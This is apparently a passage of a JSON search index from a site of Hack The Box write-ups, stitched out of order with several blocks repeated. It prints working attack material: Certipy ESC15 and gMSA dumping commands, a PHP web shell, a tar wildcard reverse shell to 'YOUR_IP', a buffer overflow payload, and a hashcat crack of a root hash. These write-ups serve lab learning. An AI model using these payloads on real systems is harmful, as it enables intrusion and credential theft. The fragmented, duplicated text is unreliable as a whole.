Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password.

See CVE-2024-49019 or the wiki for more details. The WebServer template has a vulnerability (ESC15) that allows us to create a certificate as if we were another user. This means we could gain access to important accounts, including Domain Admin, and use it to escalate privileges within the domain. Instructions for exploitation: ESC15\nTo exploit the vulnerability, we first request a certificate in the name of the Administrator using Certipy.\ncertipy-ad req -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -target DC01.tombwatcher.htb -u cert_admin@tombwatcher.htb -p \u0026#39;admin1234\u0026#39; -template WebServer -upn administrator@tombwatcher.htb -application-policies \u0026#39;Client Authentication\u0026#39; This command generates a .pfx file containing the certificate with Administrator privileges.\nNext, we use that certificate to authenticate and open an LDAP session with administrative access.\ncertipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell This gives us a Domain Admin session, allowing us to control the domain and execute critical actions.\nUsing the help command, we see what actions can be executed.\nWe can change the Administrator user’s password.\nFinally, we obtain the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/tombwatcher/","summary":"Difficulty: Medium 🟠","title":"TombWatcher - Hack The Box"},{"content":"\rWe start by performing a quick port scan with Nmap to see which ports are open.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn -vvv 10.10.11.76 Using these ports, we now perform a deeper scan, saving the results to a file called \u0026ldquo;target\u0026rdquo;.\nnmap -sCV -p445,135,139,53,88,49668,389,2222,3268,58816,5985,58833,58815,58828,3269 -n -Pn 10.10.11.76 -oN target We add the domain to the /etc/hosts file so we can resolve both the domain and the domain controller name.\nTo start hacking the machine, we are given some initial credentials.\nryan.naylor : HollowOct31Nyt When trying to enumerate SMB shares with the credentials ryan.naylor:HollowOct31Nyt, authentication fails. This is not because the credentials are wrong, but because the Active Directory server does not allow direct authentication with username and password, it requires Kerberos. In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly.

In case the id_rsa is not in that directory but, for example, in /root/.ssh/id_rsa, we should create a symbolic link pointing to it like this:\nln -s /root/.ssh/id_rsa id_rsa With this approach, we can obtain any file owned by root without any issues.

We will test it with:\nhttp://environment.htb/?--env=test We continue exploring other paths to see if we can find something more useful.\nThe interesting part is found on the /login page.\nIf we intercept the request with Burp Suite and leave the “remember” field empty, submitting the request will trigger a code error.\nAs we can see, if we change the environment to “preprod”, it gives us a session as the user with ID 1 and redirects us to /management/dashboard. Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;.

We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation.

In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/. In this case, we\u0026rsquo;re granting SUID permissions to bash.\necho \u0026#39;bash\u0026#39; | nc -lvnp 10000 What I mentioned can be observed in the code\rAfter executing the exploit, we notice a brief connection.

When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained!

This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly.

Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password.

See CVE-2024-49019 or the wiki for more details. The WebServer template has a vulnerability (ESC15) that allows us to create a certificate as if we were another user. This means we could gain access to important accounts, including Domain Admin, and use it to escalate privileges within the domain. Instructions for exploitation: ESC15\nTo exploit the vulnerability, we first request a certificate in the name of the Administrator using Certipy.\ncertipy-ad req -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -target DC01.tombwatcher.htb -u cert_admin@tombwatcher.htb -p \u0026#39;admin1234\u0026#39; -template WebServer -upn administrator@tombwatcher.htb -application-policies \u0026#39;Client Authentication\u0026#39; This command generates a .pfx file containing the certificate with Administrator privileges.\nNext, we use that certificate to authenticate and open an LDAP session with administrative access.\ncertipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell This gives us a Domain Admin session, allowing us to control the domain and execute critical actions.\nUsing the help command, we see what actions can be executed.\nWe can change the Administrator user’s password.\nFinally, we obtain the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/tombwatcher/","summary":"Difficulty: Medium 🟠","title":"TombWatcher - Hack The Box"},{"content":"\rWe start by performing a quick port scan with Nmap to see which ports are open.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn -vvv 10.10.11.76 Using these ports, we now perform a deeper scan, saving the results to a file called \u0026ldquo;target\u0026rdquo;.\nnmap -sCV -p445,135,139,53,88,49668,389,2222,3268,58816,5985,58833,58815,58828,3269 -n -Pn 10.10.11.76 -oN target We add the domain to the /etc/hosts file so we can resolve both the domain and the domain controller name.\nTo start hacking the machine, we are given some initial credentials.\nryan.naylor : HollowOct31Nyt When trying to enumerate SMB shares with the credentials ryan.naylor:HollowOct31Nyt, authentication fails. This is not because the credentials are wrong, but because the Active Directory server does not allow direct authentication with username and password, it requires Kerberos. In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly.

In case the id_rsa is not in that directory but, for example, in /root/.ssh/id_rsa, we should create a symbolic link pointing to it like this:\nln -s /root/.ssh/id_rsa id_rsa With this approach, we can obtain any file owned by root without any issues.

We will test it with:\nhttp://environment.htb/?--env=test We continue exploring other paths to see if we can find something more useful.\nThe interesting part is found on the /login page.\nIf we intercept the request with Burp Suite and leave the “remember” field empty, submitting the request will trigger a code error.\nAs we can see, if we change the environment to “preprod”, it gives us a session as the user with ID 1 and redirects us to /management/dashboard. Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;.

We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation.

In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/. In this case, we\u0026rsquo;re granting SUID permissions to bash.\necho \u0026#39;bash\u0026#39; | nc -lvnp 10000 What I mentioned can be observed in the code\rAfter executing the exploit, we notice a brief connection.

When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained!

This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly.

Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password.

